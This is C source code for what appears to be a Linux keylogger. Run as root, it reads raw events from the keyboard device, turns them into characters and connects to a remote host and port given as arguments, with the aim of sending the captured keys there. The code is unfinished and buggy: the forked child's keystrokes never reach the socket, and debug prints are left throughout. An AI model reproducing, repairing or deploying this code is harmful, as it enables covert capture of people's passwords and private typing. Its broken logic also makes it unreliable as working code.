#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h> 
#include <linux/input.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <errno.h>
#include <unistd.h>
#include <linux/input-event-codes.h>
#include <stdint.h>

#define KEY_PRESSED 1

char* convertEventCode(uint16_t code, int shifted){
  static char *strings[] = {"","[esc]","1","2","3","4","5","6","7","8","9","0","-","=","[backspace]","[tab]","q","w","e","r","t","y","u"
      ,"i","o","p","[","]","[enter]","[lctrl]","a","s","d","f","g","h","j","k","l",";","'","`","[lshift]","\\","z","x","c","v","b","n","m",",",".","/","[rshift]","[kp*]","[lalt]",
      " ","[caps]","[f1]","[f2]","[f3]","[f4]","[f5]","[f6]","[f7]","[f8]","[f9]","[f10]","[numlock]","[scrolllock]","[kp7]","[kp8]","[kp9]","[kp-]","[kp4]","[kp5]","[kp6]",
      "[kp+]","[kp1]","[kp2]","[kp3]","[kp0]","[kp.]","[?]","[?]","[f11]","[f12]"};
 
 
  static char *STRINGS[] = {"","[esc]","!","@","#","$","%","^","&","*","(",")","_","+","[backspace]","[tab]","Q","W","E","R","T","Y","U"
      ,"I","O","P","{","}","[enter]","[lctrl]","A","S","D","F","G","H","J","K","L",":","\"","~","[lshift]","|","Z","X","C","V","B","N","M","<",">","?","[rshift]","[kp*]","[lalt]",
      " ","[caps]","[f1]","[f2]","[f3]","[f4]","[f5]","[f6]","[f7]","[f8]","[f9]","[f10]","[numlock]","[scrolllock]","[kp7]","[kp8]","[kp9]","[kp-]","[kp4]","[kp5]","[kp6]",
      "[kp+]","[kp1]","[kp2]","[kp3]","[kp0]","[kp.]","[?]","[?]","[f11]","[f12]"};
  if(code <=88 && code>=0){
      if(shifted)
          return STRINGS[code];
      else
          return strings[code];
  }else{
      return "[Unsupported key]";
  }
   
}

void getInput(char *value){
  struct input_event event;
  int fd,rd, shift = 0;
  uid_t pid;
  //char *value;
  pid = getuid();
   
  if(pid!=0){
      printf("Requires Root Access\n");
      return -1;
  }
   
  fd = open("/dev/input/by-path/platform-i8042-serio-0-event-kbd", O_RDONLY | O_NONBLOCK);
 
 
  if(fd==-1){
      printf("errno = %d\n",errno);
      return -1;  
  }
  ssize_t size = 0;    
 
  //FILE* log = fopen("log.txt","a");
  while((size>-1) || errno == EAGAIN || errno == EWOULDBLOCK){
      if(event.type == EV_KEY){
          if(event.value == KEY_PRESSED){
              value = convertEventCode(event.code, shift);  
              //fprintf(log,"%s",value);
              //fflush(log);
              if(event.code == KEY_LEFTSHIFT || event.code == KEY_RIGHTSHIFT){
                  shift++;
              }
          }
          if(event.value == 0 ){
              if(event.code == KEY_LEFTSHIFT || event.code == KEY_RIGHTSHIFT){
                  shift--;
              }
          }
      }
      size = read(fd,&event,sizeof(event));
  }
  //fclose(log);
  //return value;
  printf("errno = %d\n",errno);
}

void error(const char *msg)
{
    perror(msg);
    exit(0);
}

int main(int argc, char *argv[])
{
	printf("first\n ");
    int sockfd, portno, n;
    struct sockaddr_in serv_addr;
    struct hostent *server;
    pid_t childPID;
    char buffer[256];
    if (argc < 3) {
       fprintf(stderr,"usage %s hostname port\n", argv[0]);
       exit(0);
    }
printf("second\n ");
    portno = atoi(argv[2]);
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) 
        error("ERROR opening socket");
    server = gethostbyname(argv[1]);
    if (server == NULL) {
        fprintf(stderr,"ERROR, no such host\n");
        exit(0);
    }
printf("third\n ");
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    bcopy((char *)server->h_addr, 
         (char *)&serv_addr.sin_addr.s_addr,
         server->h_length);
    serv_addr.sin_port = htons(portno);
printf("fourth\n ");
    if (connect(sockfd,(struct sockaddr *) &serv_addr,sizeof(serv_addr)) < 0) 
        error("ERROR connecting");
printf("fifth\n ");
    printf("Please enter the message: ");
    bzero(buffer,256);
    childPID = fork();// creating a child process
printf("fork \n ");
    if(childPID >=0)// fork was successful
    {
		if(childPID ==0) //child process
		{		
    //fgets(buffer,255,stdin);
    		getInput(buffer);
		}else{
    		n = write(sockfd,buffer,strlen(buffer));
    		if (n < 0) 
         		error("ERROR writing to socket");
    		bzero(buffer,256);
    		n = read(sockfd,buffer,255);
    		if (n < 0) 
         		error("ERROR reading from socket");
    		printf("%s\n",buffer);
		}
	}
    close(sockfd);
    return 0;
}
